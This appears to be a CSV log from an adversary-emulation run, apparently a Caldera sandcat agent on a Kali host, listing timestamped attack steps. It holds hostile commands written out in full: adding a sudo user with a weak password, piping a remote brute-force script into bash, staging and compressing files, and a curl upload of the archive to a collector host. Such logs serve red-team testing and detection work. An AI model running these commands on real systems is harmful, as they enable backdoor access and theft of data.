Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2025-09-16T07:44:02Z,Create staging directory,snnriz,cyberpi,2689,mkdir -p staged && echo $PWD/staged,mkdir -p staged && echo $PWD/staged
2025-09-16T07:44:42Z,SUDO Brute Force - Debian,snnriz,cyberpi,2695,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-09-16T07:45:27Z,Find files,snnriz,cyberpi,2699,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
2025-09-16T07:45:42Z,SUDO Brute Force - Debian,snnriz,cyberpi,2702,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-09-16T07:45:57Z,SUDO Brute Force - Debian,snnriz,cyberpi,2703,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-09-16T07:46:28Z,Find files,snnriz,cyberpi,2712,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
2025-09-16T07:47:23Z,Find files,snnriz,cyberpi,2718,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
2025-09-16T07:48:33Z,Stage sensitive files,snnriz,cyberpi,2722,cp /boot/grub/themes/kali/select_c.png /home/kali/sandcat/gocat/staged,cp /boot/grub/themes/kali/select_c.png /home/kali/sandcat/gocat/staged
2025-09-16T07:49:34Z,Stage sensitive files,snnriz,cyberpi,2725,cp /boot/grub/themes/kali/select_w.png /home/kali/sandcat/gocat/staged,cp /boot/grub/themes/kali/select_w.png /home/kali/sandcat/gocat/staged
2025-09-16T07:50:24Z,Stage sensitive files,snnriz,cyberpi,2727,cp /boot/grub/themes/kali/select_e.png /home/kali/sandcat/gocat/staged,cp /boot/grub/themes/kali/select_e.png /home/kali/sandcat/gocat/staged
2025-09-16T07:51:04Z,Compress staged directory,snnriz,cyberpi,2729,tar -P -zcf /home/kali/sandcat/gocat/staged.tar.gz /home/kali/sandcat/gocat/staged && echo /home/kali/sandcat/gocat/staged.tar.gz,tar -P -zcf /home/kali/sandcat/gocat/staged.tar.gz /home/kali/sandcat/gocat/staged && echo /home/kali/sandcat/gocat/staged.tar.gz
2025-09-16T07:51:59Z,Exfil staged directory,snnriz,cyberpi,,curl -F "data=@/home/kali/sandcat/gocat/staged.tar.gz" --header "X-Request-ID: `hostname`-snnriz" http://192.168.1.41:8888/file/upload,curl -F "data=@/home/kali/sandcat/gocat/staged.tar.gz" --header "X-Request-ID: `hostname`-snnriz" http://192.168.1.41:8888/file/upload
